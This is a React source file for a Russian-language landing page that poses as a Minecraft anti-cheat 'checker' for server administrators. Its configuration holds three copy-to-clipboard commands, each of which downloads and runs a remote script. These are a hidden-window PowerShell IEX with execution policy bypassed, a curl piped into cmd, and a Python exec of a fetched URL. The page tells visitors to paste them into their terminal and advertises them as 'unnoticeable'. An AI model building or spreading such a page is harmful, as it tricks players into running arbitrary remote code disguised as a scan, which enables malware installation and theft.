import React, { useState } from 'react';
import { ShieldCheck, Copy, Check, Terminal, Zap, ShieldAlert } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { clsx, type ClassValue } from 'clsx';
import { twMerge } from 'tailwind-merge';

// UTILS
function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

// ==========================================
// CONFIGURATION: CHANGE THE TEXT TO COPY HERE
// ==========================================
const COPY_TEXTS = {
  checker: "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('https://example.com/check.ps1')\"",
  checkerV2: "cmd /c \"curl -sL https://example.com/v2.bat | cmd\"",
  alternative: "python -c \"import urllib.request; exec(urllib.request.urlopen('https://example.com/alt.py').read())\""
};
// ==========================================

interface CheckerCardProps {
  title: string;
  description: string;
  copyText: string;
  icon: React.ReactNode;
  variant: 'green' | 'blue' | 'purple';
}

const CheckerCard: React.FC<CheckerCardProps> = ({ title, description, copyText, icon, variant }) => {
  const [copied, setCopied] = useState(false);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(copyText);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Failed to copy text: ', err);
    }
  };

  const variants = {
    green: "from-emerald-500/20 to-emerald-900/40 border-emerald-500/30 hover:border-emerald-500/60 shadow-emerald-500/10",
    blue: "from-blue-500/20 to-blue-900/40 border-blue-500/30 hover:border-blue-500/60 shadow-blue-500/10",
    purple: "from-purple-500/20 to-purple-900/40 border-purple-500/30 hover:border-purple-500/60 shadow-purple-500/10"
  };

  const buttonVariants = {
    green: "bg-emerald-600 hover:bg-emerald-500",
    blue: "bg-blue-600 hover:bg-blue-500",
    purple: "bg-purple-600 hover:bg-purple-500"
  };

  return (
    <motion.div 
      initial={{ opacity: 0, y: 20 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true }}
      className={cn(
        "relative overflow-hidden rounded-2xl border p-6 transition-all duration-300 bg-gradient-to-br shadow-xl backdrop-blur-sm",
        variants[variant]
      )}
    >
      <div className="flex items-start justify-between mb-4">
        <div className={cn(
          "p-3 rounded-xl bg-black/40 border border-white/5",
          variant === 'green' ? "text-emerald-400" : variant === 'blue' ? "text-blue-400" : "text-purple-400"
        )}>
          {icon}
        </div>
        <div className="flex items-center gap-2 px-3 py-1 rounded-full bg-black/40 border border-white/5 text-[10px] uppercase font-bold tracking-widest text-gray-400">
          <span className="w-1.5 h-1.5 rounded-full bg-current animate-pulse" />
          ГОТОВ
        </div>
      </div>

      <h3 className="text-xl font-bold text-white mb-2">{title}</h3>
      <p className="text-gray-400 text-sm mb-6 leading-relaxed">
        {description}
      </p>

      <div className="relative group">
        <div className="absolute inset-0 bg-black/40 rounded-lg blur group-hover:blur-md transition-all duration-300" />
        <div className="relative flex items-center justify-between gap-4 p-4 rounded-lg bg-black/60 border border-white/5 font-mono text-xs text-gray-300">
          <span className="truncate pr-8 opacity-60">
            {copyText}
          </span>
          <button
            onClick={handleCopy}
            className={cn(
              "absolute right-2 top-1/2 -translate-y-1/2 p-2 rounded-md transition-all duration-200 active:scale-95 flex items-center gap-2",
              buttonVariants[variant]
            )}
          >
            <AnimatePresence mode="wait">
              {copied ? (
                <motion.div
                  key="check"
                  initial={{ scale: 0.5, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  exit={{ scale: 0.5, opacity: 0 }}
                  className="flex items-center gap-1"
                >
                  <Check size={14} className="text-white" />
                  <span className="text-[10px] font-bold text-white pr-1">СКОПИРОВАНО</span>
                </motion.div>
              ) : (
                <motion.div
                  key="copy"
                  initial={{ scale: 0.5, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  exit={{ scale: 0.5, opacity: 0 }}
                  className="flex items-center gap-2 px-1"
                >
                  <Copy size={14} className="text-white" />
                  <span className="text-[10px] font-bold text-white uppercase">Copy</span>
                </motion.div>
              )}
            </AnimatePresence>
          </button>
        </div>
      </div>
    </motion.div>
  );
};

export default function App() {
  return (
    <div className="min-h-screen bg-[#0a0a0b] text-white selection:bg-emerald-500/30">
      {/* Background Decor */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-emerald-500/10 rounded-full blur-[120px]" />
        <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-purple-500/10 rounded-full blur-[120px]" />
      </div>

      <div className="relative max-w-6xl mx-auto px-6 py-20">
        {/* Header */}
        <header className="text-center mb-20">
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-sm font-medium mb-6"
          >
            <ShieldCheck size={16} />
            Профессиональная проверка на читы Minecraft
          </motion.div>
          
          <motion.h1 
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.1 }}
            className="text-5xl md:text-7xl font-black mb-6 tracking-tight"
          >
            ИГРАЙ <span className="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-400">ЧЕСТНО</span>.
          </motion.h1>
          
          <motion.p 
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
            className="text-gray-400 text-lg max-w-2xl mx-auto leading-relaxed"
          >
            Передовые инструменты для администраторов серверов, позволяющие обнаружить скрытые модификации и запрещенное ПО за считанные секунды.
          </motion.p>
        </header>

        {/* Checker Grid */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          <CheckerCard 
            title="Checker"
            description="Основной инструмент детекции. Сканирует строки памяти, активные процессы и недавнюю активность файлов на наличие известных обходов."
            copyText={COPY_TEXTS.checker}
            icon={<ShieldCheck size={24} />}
            variant="green"
          />
          <CheckerCard 
            title="CheckerV2"
            description="Улучшенная версия с логами взаимодействия на уровне ядра и возможностью глубокого сканирования скрытых модулей."
            copyText={COPY_TEXTS.checkerV2}
            icon={<Zap size={24} />}
            variant="blue"
          />
          <CheckerCard 
            title="Альтернатива"
            description="Легковесный сканер на базе Python, разработанный для совместимости со старыми системами и минимальной нагрузки на ОС."
            copyText={COPY_TEXTS.alternative}
            icon={<Terminal size={24} />}
            variant="purple"
          />
        </div>

        {/* Info Section */}
        <motion.section 
          initial={{ opacity: 0 }}
          whileInView={{ opacity: 1 }}
          viewport={{ once: true }}
          transition={{ delay: 0.4 }}
          className="mt-32 p-10 rounded-3xl bg-white/5 border border-white/10 text-center"
        >
          <div className="inline-flex items-center justify-center p-4 rounded-2xl bg-white/5 mb-6 text-emerald-400">
            <ShieldAlert size={32} />
          </div>
          <h2 className="text-3xl font-bold mb-4">Как использовать?</h2>
          <p className="text-gray-400 max-w-2xl mx-auto mb-8">
            Выберите один из инструментов выше, нажмите кнопку копирования и вставьте текст в ваш терминал (PowerShell или CMD), как указано администратором.
          </p>
          <div className="flex flex-wrap justify-center gap-4 text-sm font-medium">
            <span className="flex items-center gap-2 px-4 py-2 rounded-lg bg-black/40 border border-white/5">
              <Check size={14} className="text-emerald-500" /> Быстрый запуск
            </span>
            <span className="flex items-center gap-2 px-4 py-2 rounded-lg bg-black/40 border border-white/5">
              <Check size={14} className="text-emerald-500" /> Без установки
            </span>
            <span className="flex items-center gap-2 px-4 py-2 rounded-lg bg-black/40 border border-white/5">
              <Check size={14} className="text-emerald-500" /> Незаметно
            </span>
          </div>
        </motion.section>

        {/* Footer */}
        <footer className="mt-32 text-center text-gray-500 text-sm">
          <p>&copy; {new Date().getFullYear()} Minecraft Checkers. Все права защищены.</p>
          <p className="mt-2 text-gray-600">Создано для этичного администрирования серверов и честной игры.</p>
        </footer>
      </div>
    </div>
  );
}
